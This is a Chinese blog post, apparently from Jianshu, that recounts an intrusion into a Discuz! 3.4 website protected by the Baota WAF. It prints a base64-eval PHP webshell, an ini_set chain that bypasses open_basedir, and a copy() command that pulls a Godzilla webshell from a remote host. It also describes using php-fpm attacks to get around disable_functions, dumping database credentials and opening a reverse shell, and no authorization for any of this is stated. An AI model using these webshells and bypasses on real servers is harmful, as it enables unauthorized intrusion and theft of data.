网络安全：绕过MSF的一次渗透测试

[ 顶峰相见8号](https://www.jianshu.com/u/619fee1a6ee1)关注赞赏支持

# 网络安全：绕过MSF的一次渗透测试

这次渗透的主站是 一个Discuz!3.4 的搭建 违法招piao 网站， 配置有宝塔WAF

image.png

用 Discuz!ML 3.X 的漏洞进行攻击，但是没有成功

image.png

发现主站外链会有一个发卡网，引导人们来这充值，是 某某发卡网，而且域名指向也是主站的ip，两个网站在同一个 ，此处忘记截图了

网上有通杀payload，写shell的过程在这里省略了

image.png

>
> **[【一>所有资源获取<一】](https://links.jianshu.com/go?to=https%3A%2F%2Fshimo.im%2Fdocs%2FC9WxVrD6V3tGcjgQ%2F)**  
>  1、网络安全学习路线  
>  2、电子书籍（白帽子）  
>  3、安全大厂内部视频  
>  4、100份src文档  
>  5、常见安全面试题  
>  6、ctf大赛经典题目解析  
>  7、全套工具包  
>  8、应急响应笔记

由于网站存在宝塔WAF ，写入shell 必须变形一下，将命令进行base64编码在传进去

`<?php @eval(base64_decode($_POST['yanshu']));?>`

image.png

在phpinfo()里可以看到，宝塔默认会设置 open_basedir 以及
disable_functions，导致蚁剑的shell直接连接之后不大好用，命令执行不了

### 绕过 open_basedir 查看文件

利用 ini_set() 来 bypass open_basedir 来获取路径名和目录内容，base64 编码之后执行，发现宝塔目录下还有其他站点目录

    
    
    eval("mkdir('1');chdir('1');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/www/wwwroot'));");
    

image.png

### 哥斯拉管理webshell

为了方便查看文件 ，使用哥斯拉马，加密器选择PHP_EVAL_XOR_BASE64，用copy命令传到服务器中，这样流量就可以不会被宝塔waf拦截了

`copy('http://xxxx/g.php','/www/wwwroot/xxx.com/g.php');`

image.png

哥斯拉马可以自动实现bypass openbase_dir ，读取数据库 用户名密码，可以更改管理员用户进后台或者脱库

image.png

image.png

### 绕过 disable_functions 执行命令

disable_functions 禁用了 putenv()、mail() 、pcntl_exec()
等函数，环境是php5.6，导致很多常规bypass的方法都用不了

image.png

网站是使用 nginx+php5.6 ，用攻击 php-fpm的办法来bypass，攻击原理可以看 参考链接

先找到php-fpm的配置 如：/www/server/php/56/etc/php-fpm.conf

image.png

或者看nginx的配置 ，得到 php-fpm 的位置 unix:/tmp/php-cgi-56.sock

image.png

首先 选择 PAttackFPM 将模块加载并执行

image.png

再利用哥斯拉马中 bypass disable_functions 的模块 ，成功执行命令

image.png

获取反弹 shell ，可以进一步尝试对主机进行提权了

image.png

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [php中函数禁用绕过的原理与利用](https://www.jianshu.com/p/8f058a9556b9)

转载自公众号：合天智汇 本文涉及知识点实操练习-绕过函数过滤 https://www.hetianlab.com/...

[苍简](https://www.jianshu.com/u/069864017802)阅读 505评论 0赞 0

  * [蚁剑食用指南](https://www.jianshu.com/p/a89ad062c017)

前言 蚁剑是在攻防时常用的webshell管理器，但一直从未真正熟悉过。 webshell php 在自己编写ph...

[CSeroad](https://www.jianshu.com/u/859a42ec7c8f)阅读 9,901评论 0赞 3

  * [.user.ini配置文件在渗透中的利用](https://www.jianshu.com/p/c2ed6b05c964)

前言： 官方介绍： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文...

[book4yi](https://www.jianshu.com/u/d60a4e568a69)阅读 3,705评论 0赞 1

  * [MOCTF_WEB_WRITEUP](https://www.jianshu.com/p/4bf347959bd5)

事情再多也可以做做题娱乐娱乐。 0x01 一道水题 一群可爱小青蛙，F12审查元素可以找到flag。 0x02还是...

[NoviceQAQ](https://www.jianshu.com/u/af148a609e66)阅读 2,415评论 0赞 0

  * [CentOS 7.0编译安装Nginx1.6.0+MySQL5.6.19+PHP5.5.14](https://www.jianshu.com/p/880aa98a2290)

一、配置防火墙，开启80端口、3306端口 CentOS 7.0默认使用的是firewall作为防火墙，这里改为i...

[ArleyDu](https://www.jianshu.com/u/760259ed99c5)阅读 1,898评论 0赞 0

 